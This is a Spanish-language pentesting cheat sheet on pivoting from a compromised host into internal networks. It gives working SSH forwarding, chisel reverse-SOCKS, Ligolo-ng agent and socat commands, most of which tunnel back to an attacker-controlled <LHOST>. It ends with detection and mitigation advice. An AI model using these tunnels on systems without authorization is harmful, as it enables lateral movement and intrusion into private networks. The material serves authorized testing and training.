---
title: Pivoting — SSH, chisel y Ligolo-ng
tags: [pivoting, tunneling, chisel, ligolo, ssh]
---

# Pivoting: llegar a la red interna

[🇬🇧 English](pivoting.en.md) | **Español**

## 1. Elegir la herramienta

| Situación | Herramienta |
|---|---|
| SSH en el host comprometido | `ssh -L/-R/-D` |
| Solo HTTP/S en salida | `chisel` |
| Necesitas rutas y `nmap` como si fuera local | `ligolo-ng` |
| Un solo puerto | `socat` |

## 2. SSH

```bash
# local: acceder a un servicio interno a través del host
ssh -L 8080:127.0.0.1:8080 user@<pivot>
# remoto: exponer tu listener al host interno
ssh -R 9001:127.0.0.1:9001 user@<pivot>
# SOCKS dinámico
ssh -D 1080 -N -f user@<pivot>
```

Con SOCKS, `proxychains4` + `nmap -sT -Pn` (sin SYN, que no atraviesa el proxy). `ProxyCommand` en `~/.ssh/config` evita reescribir rutas.

## 3. chisel

Servidor en tu máquina:

```bash
chisel server -p 8000 --reverse
```

Cliente en el pivote (subido por HTTP o SMB):

```bash
./chisel client <LHOST>:8000 R:socks
./chisel client <LHOST>:8000 R:3306:127.0.0.1:3306
```

`R:socks` abre un SOCKS5 en `127.0.0.1:1080` de tu lado; el tráfico sale por el pivote.

## 4. Ligolo-ng

Proxy local:

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

Agente en el pivote:

```bash
./agent -connect <LHOST>:11601 -ignore-cert
```

En la consola del proxy: `session`, `ifconfig` (ver redes del agente), `start`. Añade la ruta:

```bash
sudo ip route add 192.168.2.0/24 dev ligolo
```

Ahora `nmap -sS 192.168.2.2` funciona directo, sin proxychains.

## 5. socat y redirecciones puntuales

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80
```

Útil cuando solo necesitas un puerto y no quieres montar un túnel completo. En Windows, `netsh interface portproxy add v4tov4 ...`.

## 6. Errores típicos

- **`nmap -sS` no ve nada por SOCKS** → usa `-sT`; SYN no atraviesa proxychains.
- **chisel conecta pero no hay tráfico** → el cliente escucha en `127.0.0.1` del pivote; revisa `R:` vs `L:` y el firewall de salida.
- **Ligolo: `start` sin ruta** → falta `ip route add`; sin ella el kernel no sabe por dónde enviar.
- **DNS no resuelve en la red interna** → apunta `/etc/hosts` o usa `--dns` en el proxy de Ligolo.
- **Túnel que se corta** → `autossh`/`screen` y reconexión del agente; anota el estado antes de cerrar.

## 7. Detección y mitigación

- Salida restringida por defecto y proxy obligatorio; bloquear TUN/TAP y túneles en endpoints.
- Alertar de conexiones persistentes a un mismo host externo y de `chisel`/`ligolo` por firma.
- Segmentación entre VLANs y registro de flujos este-oeste.
- En el writeup, documenta qué red se veía desde cada salto: es la parte que se olvida.

MITRE: T1572, T1090.003, T1021.004.
